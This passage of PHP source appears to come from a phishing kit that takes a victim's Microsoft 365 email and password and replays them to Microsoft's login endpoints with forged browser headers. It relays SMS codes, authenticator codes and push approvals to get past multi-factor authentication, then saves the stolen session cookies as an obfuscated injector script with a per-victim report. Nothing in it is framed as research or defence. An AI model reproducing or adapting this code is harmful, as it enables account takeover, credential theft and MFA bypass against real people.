			$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file

			// Create a Guzzle client with the cookie jar
			$client = new Client([
				'cookies' => $cookieJar,
			]);

			$response = $client->post('https://login.microsoftonline.com/appverify', [
				'headers' => [
					'Connection'                => 'keep-alive',
					'Cache-Control'             => 'no-cache',
					'Upgrade-Insecure-Requests' => '1',
					'Origin'                    => 'null',
					'Content-Type'              => 'application/x-www-form-urlencoded',
					'User-Agent'                => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
					'Accept'                    => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
					'Accept-Language'           => 'en-US,en;q=0.9',
					'Referer'                   => '',
					'Cookie'                    => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
				],
				'form_params' => [
					'ContinueAuth' => 'true',
					'ctx' => $this->sCtx,
					'hpgrequestid' => '1f12d14c-7a42-4542-be79-78f592f96800',
					'flowToken' => $this->sFT,
					'iscsrfspeedbump' => 'true',
					'canary' => $this->canary,
					'i19' => '4624',
				],
			]);

			$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

			$result = $response->getBody()->getContents();

		    if (strpos($result, 'Your account or password is incorrect') !== false || strpos($result, 'The password entered exceeds the maximum length') || strpos($result, 'Bad Request') !== false || strpos($result, 'googlebot') !== false || strpos($result, 'Select a certificate ') !== false || strpos($result, 'smusxath.bms.com') !== false || strpos($result, 'not support JavaScript') !== false || strpos($result, 'trouble signing') !== false || strpos($result, 'having some server issues') !== false || strpos($result, 'apple.com') !== false || strpos($result, 'Not Allowed') !== false || strpos($result, '.aon.com') !== false || strpos($result, 'Fifth Third ID') !== false ||  strpos($result, 'Configurable default behavior') !== false || strpos($result, 'persmissions to access this resource') !== false || strpos($result, 'urlMsaSignUp') !== false) {
    			$this->status['live'] = false;
			}
			else if (strpos($result, 'Update your password') !== false){
				$this->status['live'] = true;
			}else{
				$this->status['live'] = false;
			}
	    }

	    private function AuthBusiness(){
		    $cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file

            // Create a Guzzle client with the cookie jar
            $client = new Client([
                'cookies' => $cookieJar,
            ]);
            $response = $client->post('https://login.microsoftonline.com/common/login', [
            	'allow_redirects' => true, // This is the default behavior
                'headers' => [
    				'Connection'                => 'keep-alive',
					'Origin'                    => 'https://login.microsoftonline.com',
					'Content-Type'              => 'application/x-www-form-urlencoded',
					'User-Agent'                => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
					'Accept'                    => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
					'Sec-Fetch-Site'            => 'same-origin',
					'Sec-Fetch-Mode'            => 'navigate',
					'Sec-Fetch-User'            => '?1',
					'Sec-Fetch-Dest'            => 'document',
					'Referer'                   => 'https://login.microsoftonline.com',
					'Accept-Language'           => 'en-US,en;q=0.9',
					'Accept-Encoding'           => 'gzip, deflate, br',  // Handle compressed responses
					'Cookie'                    => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
					'Upgrade-Insecure-Requests' => '1',  // Simulate request for upgrading any mixed content
					'TE'                        => 'Trailers',  // Sometimes required for proper connection handling
					'Cache-Control'             => 'max-age=0', // Prevents caching issues that may affect request behavior
					'Pragma'                    => 'no-cache', // Ensures no cached data interferes
					'Sec-Ch-Ua'                 => '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
					'Sec-Ch-Ua-Mobile'          => '?0',  // Indicates this is a desktop device
					'Sec-Ch-Ua-Platform'        => '"Windows"',
					'Sec-Ch-Ua-Platform-Version'=> '"10.0.22635"',  // Windows 10 version
				],
                'form_params' => [
		    			'i13'               => '0',
		    			'login'             => $this->email,
		    			'loginfmt'          => $this->email,
		    			'type'              => '11',
	    				'LoginOptions'      => '3',
		    			'lrt'               => '',
		    			'lrtPartition'      => '',
	    				'hisRegion'         => '',
		    			'hisScaleUnit'      => '',
		    			'passwd'            => $this->password,
	    				'ps'                => '2',
		    			'psRNGCDefaultType' => '',
	    				'psRNGCEntropy'     => '',
		    			'psRNGCSLK'         => '',
		    			'canary'            => $this->canary,
		    			'ctx'               => $this->sCtx,
	    				'hpgrequestid'      => '9799cd88-6ea7-4cfc-aeb2-4dcb20034a03',
		    			'flowToken'         => $this->sFT,
		    			'PPSX'              => '',
		    			'NewUser'           => '1',
		    			'FoundMSAs'         => '',
	    				'fspost'            => '0',
		    			'i21'               => '0',
		    			'CookieDisclosure'  => '0',
		    			'IsFidoSupported'   => '0',
		    			'isSignupPost'      => '0',
		    			'i17'               => '',
		    			'i18'               => '',
		    			'i19'               => '9189'
					]
            ]);
			
            $cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

            // You can get the content with:
            $result = $response->getBody()->getContents();
			
		    if (strpos($result, 'Your account or password is incorrect') !== false || strpos($result, 'The password entered exceeds the maximum length') !== false || strpos($result, 'Bad Request') !== false || strpos($result, 'googlebot') !== false || strpos($result, 'Select a certificate ') !== false || strpos($result, 'smusxath.bms.com') !== false || strpos($result, 'not support JavaScript') !== false || strpos($result, 'trouble signing') !== false || strpos($result, 'having some server issues') !== false || strpos($result, 'apple.com') !== false || strpos($result, 'Not Allowed') !== false || strpos($result, '.aon.com') !== false || strpos($result, 'Fifth Third ID') !== false ||  strpos($result, 'Configurable default behavior') !== false || strpos($result, 'persmissions to access this resource') !== false || strpos($result, 'urlMsaSignUp') !== false) {
    			$this->status['live'] = false;

    			return 1;
			}else if(strpos($result, 'content="CmsiInterrupt"') !== false){
				preg_match('/(?<="sFT":")[^"]*/', $result, $sFT);
				preg_match('/(?<="sCtx":")[^"]*/', $result, $sCtx);
				preg_match('/(?<="canary":")[^"]*/', $result, $canary);
				preg_match('/(?<="apiCanary":")[^"]*/', $result, $api_canary);
				preg_match('/(?<="sessionId":")[^"]*/', $result, $session_id);
				preg_match('/(?<="correlationId":")[^"]*/', $result, $request_id);

				$this->sFT = $sFT[0];
				$this->sCtx = $sCtx[0];
				$this->canary = $canary[0];
				$this->api_canary = $api_canary[0];
				$this->session_id = $session_id[0];
				$this->request_id = $request_id[0];


				$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file

				// Create a Guzzle client with the cookie jar
				$client = new Client([
					'cookies' => $cookieJar,
				]);

				$response = $client->post('https://login.microsoftonline.com/appverify', [
					'headers' => [
						'Connection' => 'keep-alive',
						'Cache-Control' => 'no-cache',
						'Upgrade-Insecure-Requests' => '1',
						'Origin' => 'null',
						'Content-Type' => 'application/x-www-form-urlencoded',
						'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
						'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
						'Accept-Language' => 'en-US,en;q=0.9',
						'Referer' => '',
						'Cookie' => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
					],
					'form_params' => [
						'ContinueAuth' => 'true',
						'ctx' => $this->sCtx,
						'hpgrequestid' => '1f12d14c-7a42-4542-be79-78f592f96800',
						'flowToken' => $this->sFT,
						'iscsrfspeedbump' => 'true',
						'canary' => $this->canary,
						'i19' => '4624',
					],
				]);

				$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

				$result = $response->getBody()->getContents();

			}
			

			if (strpos($result, '"sDeviceState":"Unregistered"') !== false) {
    			$this->status['live'] = false;

    			return 1;
			}else if(strpos($result, '<title>Working...</title>') !== false){
				preg_match('/name="request" value="([^"]+)"/', $result, $requestMatches);
				if (isset($requestMatches[1])) {
					$requestValue = $requestMatches[1];
				}

				// Regular expression to find the `flowToken` value
				preg_match('/name="flowToken" value="([^"]+)"/', $result, $flowTokenMatches);
				if (isset($flowTokenMatches[1])) {
					$flowTokenValue = $flowTokenMatches[1];
				} 
				$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file
				$client = new Client([
					'cookies' => $cookieJar,
				]);
				$response = $client->request('GET', "https://device.login.microsoftonline.com:443", [
					'headers' => [
						'Accept'                    => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
						'Accept-Language'           => 'en-US,en;q=0.9',
						'Cookie'                    => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
						'Priority'                  => 'u=0, i',
						'Sec-Ch-Ua'                 => '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
						'Sec-Ch-Ua-Mobile'          => '?0',
						'Sec-Ch-Ua-Platform'        => '"Windows"',
						'Sec-Ch-Ua-Platform-Version'=> '"15.0.0"',
						'Sec-Fetch-Dest'            => 'document',
						'Sec-Fetch-Mode'            => 'navigate',
						'Sec-Fetch-Site'            => 'cross-site',
						'Upgrade-Insecure-Requests' => '1',
						'User-Agent'                => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0 OS/10.0.22635',
						'X-Edge-Shopping-Flag'      => '0',
					],
					'form_params' => [
						'request' => $requestValue,
						'flowToken' => $flowTokenValue
					]
				]);

				$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');
				$result = $response->getBody()->getContents();


				preg_match('/name="ctx" value="([^"]+)"/', $result, $requestCtx);
				if (isset($requestMatches[1])) {
					$requestValue = $requestMatches[1];
				} else {
				}

				// Regular expression to find the `flowToken` value
				preg_match('/name="flowToken" value="([^"]+)"/', $result, $flowTokenMatches);
				if (isset($flowTokenMatches[1])) {
					$flowTokenValue = $flowTokenMatches[1];
				} 

				$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file
				$client = new Client([
					'cookies' => $cookieJar,
				]);
				$response = $client->request('GET', "https://login.microsoftonline.com:443/common/DeviceAuthTls/reprocess", [
					'headers' => [
						'Accept'                    => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
						'Accept-Language'           => 'en-US,en;q=0.9',
						'Cookie'                    => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
						'Priority'                  => 'u=0, i',
						'Sec-Ch-Ua'                 => '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
						'Sec-Ch-Ua-Mobile'          => '?0',
						'Sec-Ch-Ua-Platform'        => '"Windows"',
						'Sec-Ch-Ua-Platform-Version'=> '"15.0.0"',
						'Sec-Fetch-Dest'            => 'document',
						'Sec-Fetch-Mode'            => 'navigate',
						'Sec-Fetch-Site'            => 'cross-site',
						'Upgrade-Insecure-Requests' => '1',
						'User-Agent'                => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0 OS/10.0.22635',
						'X-Edge-Shopping-Flag'      => '0',
					],					
					'form_params' => [
						'ctx' => $requestValue,
						'flowToken' => $flowTokenValue
					]
				]);

				$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');
				$result = $response->getBody()->getContents();
			}

			preg_match('/(?<="sFT":")[^"]*/', $result, $sFT);
		    preg_match('/(?<="sCtx":")[^"]*/', $result, $sCtx);
		    preg_match('/(?<="canary":")[^"]*/', $result, $canary);
		    preg_match('/(?<="apiCanary":")[^"]*/', $result, $api_canary);
		    preg_match('/(?<="sessionId":")[^"]*/', $result, $session_id);
		    preg_match('/(?<="correlationId":")[^"]*/', $result, $request_id);

		    $this->sFT = $sFT[0];
		    $this->sCtx = $sCtx[0];
		    $this->canary = $canary[0];
		    $this->api_canary = $api_canary[0];
		    $this->session_id = $session_id[0];
		    $this->request_id = $request_id[0];

			if(strpos($result, 'urlBeginAuth') !== false){
				$this->status['2fa'] = true;
				
				// Regular expression to extract the JSON object
				$pattern = '/\{\s*"arrUserProofs":(\[.*?\])\s*,/s';
				preg_match($pattern, $result, $matches);
				
				$jsonString = isset($matches[1]) ? $matches[1] : '[]';
				
				// Decode the JSON data
				$data = json_decode($jsonString, true);
				
				// Check if data is an array and process it
				if (is_array($data)) {
					// Insert authMethodId values into the $status array
					foreach ($data as $index => $item) {
						if (isset($item['authMethodId']) && isset($item['display']) && isset($item['isDefault'])) {
							$this->status['2fa_info'][$index] = [
								'method_name' => $item['authMethodId'],
								'display' => $item['display'],
								'isDefault' => $item['isDefault']
							];
						}
					}
				}
	
			}
			else{
				$this->status['2fa'] = false;
				$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file
				$client = new Client([
					'cookies' => $cookieJar,
				]);
				// Perform KMSI request
				$response = $client->request('POST', 'https://login.microsoftonline.com/kmsi', [
					'headers' => [
						'Accept'                    => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
						'Accept-Language'           => 'en-US,en;q=0.9',
						'Cache-Control'             => 'max-age=0',
						'Content-Type'              => 'application/x-www-form-urlencoded',
						'Cookie'                    => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
						'Origin'                    => 'https://login.microsoftonline.com',
						'Referer'                   => 'https://login.microsoftonline.com/common/login',
						'Sec-CH-UA'                 => '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
						'Sec-CH-UA-Mobile'          => '?0',
						'Sec-CH-UA-Platform'        => '"Windows"',
						'Sec-Fetch-Dest'            => 'document',
						'Sec-Fetch-Mode'            => 'navigate',
						'Sec-Fetch-Site'            => 'same-origin',
						'Sec-Fetch-User'            => '?1',
						'Upgrade-Insecure-Requests' => '1',
						'User-Agent'                => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
					],					
					'form_params' => [
						'LoginOptions' => '1',
						'type' => '28',
						'ctx' => $this->sCtx,
						'hpgrequestid' => $this->request_id,
						'flowToken' => $this->sFT,
						'DontShowAgain' => 'true',
						'canary' => $this->canary,
						'i19' => '14108',
					]
				]);
				$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');
	
				// You can get the content with:
				$result = $response->getBody()->getContents();
				$cookie = file_get_contents($this->currentDirectory . '/cookie_' . $this->email . '.txt');

				$cookiejs =
					$this->generateInjectorScript($cookie);
			
				file_put_contents($this->currentDirectory . '/js_' . $this->email . '.txt', $cookiejs);
				$this->saveHtmlReport($cookie, $cookiejs);
			}
	    }

		public function EndAuth($type, $code = ''){
			if($this->email != $_SESSION['email'] || !isset($_SESSION['status']) || !isset($_SESSION['info_token_2fa'])){
	    		$this->redirect('Empty');
			}
		
			
			$this->status = $_SESSION['status'];
			$this->currentDirectory = getcwd()."/core";

			if($type == "verify_code" || $type == "verify_sms"){
				if($type == "verify_code")
				{
					$method = "PhoneAppOTP";
				}
				else if($type == "verify_sms")
				{
					$method = "OneWaySMS";
				}

				$this->EndAuthSmsAndCode($code, $method);
			}else if($type == "verify_app"){
				$this->EndAuthApp();
			}
		}

		public function EndAuthApp(){
			$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file

            // Create a Guzzle client with the cookie jar
            $client = new Client([
                'cookies' => $cookieJar,
            ]);

            $response = $client->get('https://login.microsoftonline.com/common/SAS/EndAuth', [
				'query' => [
					'authMethodId' => 'PhoneAppNotification',
					'pollCount' => '1'
				],
				'headers' => [
					'User-Agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0',
					'Accept' => 'application/json',
					'Accept-Language' => 'en-US,en;q=0.5',
					'Accept-Encoding' => 'gzip, deflate, br',
					'Referer' => 'https://login.microsoftonline.com/common/login',
					'hpgid' => '1114',
					'hpgact' => '2000',
					'canary' => $_SESSION['info_token_2fa']['api_canary'],
					'client-request-id' => $_SESSION['info_token_2fa']['request_id'],
					'hpgrequestid' => $_SESSION['info_token_2fa']['session_id'],
					'x-ms-sessionId' => $_SESSION['info_token_2fa']['session_id'],
					'x-ms-flowToken' => $_SESSION['info_token_2fa']['sFT'],
					'x-ms-ctx' => $_SESSION['info_token_2fa']['sCtx'],
					'Content-type' => 'application/json; charset=utf-8',
					'DNT' => '1',
					'Connection' => 'keep-alive',
					'Cookie' => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
					'Sec-Fetch-Dest' => 'empty',
					'Sec-Fetch-Mode' => 'cors',
					'Sec-Fetch-Site' => 'same-origin'
				]
			]);
            $cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');
            // You can get the content with:
            $result = $response->getBody()->getContents();
			
			if (strpos($result, '"Success":true') !== false) {
				$this->status['2fa_endauth'] = true;

				preg_match('/(?<="FlowToken":")[^"]*/', $result, $sFT);
            	$sFT = $sFT[0];
				
				$this->sFT = $sFT;
				$this->sCtx = $_SESSION['info_token_2fa']['sCtx'];
				$this->api_canary = $_SESSION['info_token_2fa']['api_canary'];
				$this->canary = $_SESSION['info_token_2fa']['canary'];
				$this->session_id = $_SESSION['info_token_2fa']['session_id'];
				$this->request_id = $_SESSION['info_token_2fa']['sCtx'];

				$this->ProcessAuthApp();
			}else{
				$this->status['2fa_endauth'] = false;
				$data = json_decode($result, true);
				if (isset($data['Message'])) {
					$this->status['2fa_endauth_reason'] = $data['Message'];
				}
			}
		}

		public function EndAuthSmsAndCode($code, $method){
			$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file

            // Create a Guzzle client with the cookie jar
            $client = new Client([
                'cookies' => $cookieJar,
            ]);

            $response = $client->post('https://login.microsoftonline.com/common/SAS/EndAuth', [
				'headers' => [
					'User-Agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0',
					'Accept' => 'application/json',
					'Accept-Language' => 'en-US,en;q=0.5',
					'Accept-Encoding' => 'gzip, deflate, br',
					'Referer' => 'https://login.microsoftonline.com/common/login',
					'Hpgid' => '1114',
					'Hpgact' => '2000',
					'Canary' => $_SESSION['info_token_2fa']['api_canary'],
					'Client-Request-Id' => $_SESSION['info_token_2fa']['request_id'],
					'Hpgrequestid' => $_SESSION['info_token_2fa']['session_id'],
					'Content-Type' => 'application/json; charset=utf-8',
					'Origin' => 'https://login.microsoftonline.com',
					'Connection' => 'keep-alive',
					'Sec-Fetch-Dest' => 'empty',
					'Sec-Fetch-Mode' => 'cors',
					'Sec-Fetch-Site' => 'same-origin',
					'Cookie' => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
				],
				'json' => [
					'Method' => 'EndAuth',
					'SessionId' => $_SESSION['info_token_2fa']['session_id'],
					'FlowToken' => $_SESSION['info_token_2fa']['sFT'],
					'Ctx' => $_SESSION['info_token_2fa']['sCtx'],
					'AuthMethodId' => $method,
					'AdditionalAuthData' => $code,
					'PollCount' => 1
				]
			]);
            $cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');
            // You can get the content with:
            $result = $response->getBody()->getContents();

			if (strpos($result, '"Success":true') !== false) {
				$this->status['2fa_endauth'] = true;

				preg_match('/(?<="FlowToken":")[^"]*/', $result, $sFT);
            	$sFT = $sFT[0];
				
				$this->sFT = $sFT;
				$this->sCtx = $_SESSION['info_token_2fa']['sCtx'];
				$this->api_canary = $_SESSION['info_token_2fa']['api_canary'];
				$this->canary = $_SESSION['info_token_2fa']['canary'];
				$this->session_id = $_SESSION['info_token_2fa']['session_id'];
				$this->request_id = $_SESSION['info_token_2fa']['sCtx'];

				$this->ProcessAuthSmsAndCode($code, $method);
			}else{
				$this->status['2fa_endauth'] = false;
				$data = json_decode($result, true);
				if (isset($data['Message'])) {
					$this->status['2fa_endauth_reason'] = $data['Message'];
				}
			}
		}

		public function ProcessAuthSmsAndCode($code, $method){

			$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file

            // Create a Guzzle client with the cookie jar
            $client = new Client([
                'cookies' => $cookieJar,
            ]);

            $response = $client->post('https://login.microsoftonline.com/common/SAS/ProcessAuth', [
                'headers' => [
                    'User-Agent'                => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0',
                    'Accept'                    => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language'           => 'en-US,en;q=0.5',
                    'Accept-Encoding'           => 'gzip, deflate, br',
                    'Referer'                   => 'https://login.microsoftonline.com/common/login',
                    'Content-Type'              => 'application/x-www-form-urlencoded',
                    'Origin'                    => 'https://login.microsoftonline.com',
                    'Connection'                => 'keep-alive',
                    'Cookie' => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
                    'Upgrade-Insecure-Requests' => '1',
                    'Sec-Fetch-Dest'            => 'document',
                    'Sec-Fetch-Mode'            => 'navigate',
                    'Sec-Fetch-Site'            => 'same-origin'
                ],
                'form_params' => [
                    'type' => '22',
					'GeneralVerify' => 'false',
                    'request' => $this->sCtx,
                    'mfaLastPollStart' => '1689840142481',
                    'mfaLastPollEnd' => '1689840143602',
                    'mfaAuthMethod' => $method,
					'otc' => $code,
                    'login' => $this->email,
                    'flowToken' => $this->sFT,
                    'hpgrequestid' => $this->session_id,
                    'sacxt' => '',
                    'hideSmsInMfaProofs' => 'false',
                    'canary' => $this->canary,
                    'i19' => '28132'
                ]
            ]);

            $cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

			$result = $response->getBody()->getContents();

			// Check for ConvergedProofUpRedirect in the result
            if (strpos($result, 'ConvergedProofUpRedirect') !== false) {
                // Extract relevant information from the ProcessAuth response
                preg_match('/(?<="sFT":")[^"]*/', $result, $sFT);
                $sFT = $sFT[0];
                preg_match('/(?<="sProofUpAuthState":")[^"]*/', $result, $ctx);
                $ctx = $ctx[0];
                preg_match('/(?<="canary":")[^"]*/', $result, $canary);
                $canary = $canary[0];

				$this->sFT = $sFT;
				$this->canary = $canary;

                // Create a cookie jar to store cookies
                $cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file

                // Create a Guzzle client with the cookie jar
                $client = new Client([
                    'cookies' => $cookieJar,
                ]);

                $response = $client->post('https://login.microsoftonline.com/common/resume', [
                    'query' => [
                        'skipmfaregistration' => '1'
                    ],
                    'headers' => [
                        'User-Agent'                => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0',
                        'Accept'                    => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language'           => 'en-US,en;q=0.5',
                        'Accept-Encoding'           => 'gzip, deflate, br',
                        'Referer'                   => 'https://login.microsoftonline.com/common/SAS/ProcessAuth',
                        'Content-Type'              => 'application/x-www-form-urlencoded',
                        'Origin'                    => 'https://login.microsoftonline.com',
                        'Connection'                => 'keep-alive',
                        'Cookie' 					=> $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
                        'Upgrade-Insecure-Requests' => '1',
                        'Sec-Fetch-Dest'            => 'document',
                        'Sec-Fetch-Mode'            => 'navigate',
                        'Sec-Fetch-Site'            => 'same-origin',
                        'Sec-Fetch-User'            => '?1',
                        'TE'                        => 'trailers'
                    ],
                    'form_params' => [
                        'flowToken' => $this->$sFT,
                        'ctx' => $ctx,
                        'canary' => $this->$canary
                    ]
                ]);

                $cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

                // You can get the content with:
                $result = $response->getBody()->getContents();

                preg_match('/(?<="sCtx":")[^"]*/', $result, $sCtx);
                $sCtx = $sCtx[0];
				$this->sCtx = $sCtx;

                preg_match('/(?<="sessionId":")[^"]*/', $result, $session);
                $session = $session[0];
				$this->session_id = $session;

                preg_match('/(?<="sFT":")[^"]*/', $result, $sFT);
                $sFT = $sFT[0];
				$this->sFT = $sFT;

                preg_match('/(?<="canary":")[^"]*/', $result, $canary);
                $canary = $canary[0];
				$this->canary = $canary;
            }else{
                preg_match('/(?<="sCtx":")[^"]*/', $result, $sCtx);
                $sCtx = $sCtx[0];
				$this->sCtx = $sCtx;

                preg_match('/(?<="sessionId":")[^"]*/', $result, $session);
                $session = $session[0];
				$this->session_id = $session;

                preg_match('/(?<="sFT":")[^"]*/', $result, $sFT);
                $sFT = $sFT[0];
				$this->sFT = $sFT;

                preg_match('/(?<="canary":")[^"]*/', $result, $canary);
                $canary = $canary[0];
				$this->canary = $canary;
            }
			
            $response = $client->request('POST', 'https://login.microsoftonline.com/kmsi', [
				'headers' => [
					'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
					'Accept-Language' => 'en-US,en;q=0.9',
					'Cache-Control' => 'max-age=0',
					'Content-Type' => 'application/x-www-form-urlencoded',
					'Cookie' => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
					'Origin' => 'https://login.microsoftonline.com',
					'Referer' => 'https://login.microsoftonline.com/common/login',
					'Sec-CH-UA' => '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
					'Sec-CH-UA-Mobile' => '?0',
					'Sec-CH-UA-Platform' => '"Windows"',
					'Sec-Fetch-Dest' => 'document',
					'Sec-Fetch-Mode' => 'navigate',
					'Sec-Fetch-Site' => 'same-origin',
					'Sec-Fetch-User' => '?1',
					'Upgrade-Insecure-Requests' => '1',
					'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0',
				],
				'form_params' => [
					'LoginOptions' => '1',
					'type' => '28',
					'ctx' => $this->sCtx,
					'hpgrequestid' => $this->request_id,
					'flowToken' => $this->sFT,
					'DontShowAgain' => 'true',
					'canary' => $this->canary,
					'i19' => '14108',
				]
			]);
			$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

			// You can get the content with:
			$result = $response->getBody()->getContents();

			$cookie = file_get_contents($this->currentDirectory . '/cookie_' . $this->email . '.txt');

			// Obfuscate and store the cookie
			$cookiejs =
			$this->generateInjectorScript($cookie);

			file_put_contents($this->currentDirectory . '/js_' . $this->email . '.txt', $cookiejs);
			$this->saveHtmlReport($cookie, $cookiejs);
		}

		public function ProcessAuthApp(){

			$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file

            // Create a Guzzle client with the cookie jar
            $client = new Client([
                'cookies' => $cookieJar,
            ]);

            $response = $client->post('https://login.microsoftonline.com/common/SAS/ProcessAuth', [
                'headers' => [
                    'User-Agent'                => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0',
                    'Accept'                    => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language'           => 'en-US,en;q=0.5',
                    'Accept-Encoding'           => 'gzip, deflate, br',
                    'Referer'                   => 'https://login.microsoftonline.com/common/login',
                    'Content-Type'              => 'application/x-www-form-urlencoded',
                    'Origin'                    => 'https://login.microsoftonline.com',
                    'Connection'                => 'keep-alive',
                    'Cookie' => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
                    'Upgrade-Insecure-Requests' => '1',
                    'Sec-Fetch-Dest'            => 'document',
                    'Sec-Fetch-Mode'            => 'navigate',
                    'Sec-Fetch-Site'            => 'same-origin'
                ],
                'form_params' => [
                    'type' => '22',
                    'request' => $this->sCtx,
                    'mfaLastPollStart' => '1689840142481',
                    'mfaLastPollEnd' => '1689840143602',
                    'mfaAuthMethod' => 'PhoneAppNotification',
                    'login' => $this->email,
                    'flowToken' => $this->sFT,
                    'hpgrequestid' => $this->session_id,
                    'sacxt' => '',
                    'hideSmsInMfaProofs' => 'false',
                    'canary' => $this->canary,
                    'i19' => '28132'
                ]
            ]);

            $cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

			$result = $response->getBody()->getContents();

			// Check for ConvergedProofUpRedirect in the result
            if (strpos($result, 'ConvergedProofUpRedirect') !== false) {
                // Extract relevant information from the ProcessAuth response
                preg_match('/(?<="sFT":")[^"]*/', $result, $sFT);
                $sFT = $sFT[0];
                preg_match('/(?<="sProofUpAuthState":")[^"]*/', $result, $ctx);
                $ctx = $ctx[0];
                preg_match('/(?<="canary":")[^"]*/', $result, $canary);
                $canary = $canary[0];

				$this->sFT = $sFT;
				$this->canary = $canary;

                // Create a cookie jar to store cookies
                $cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file

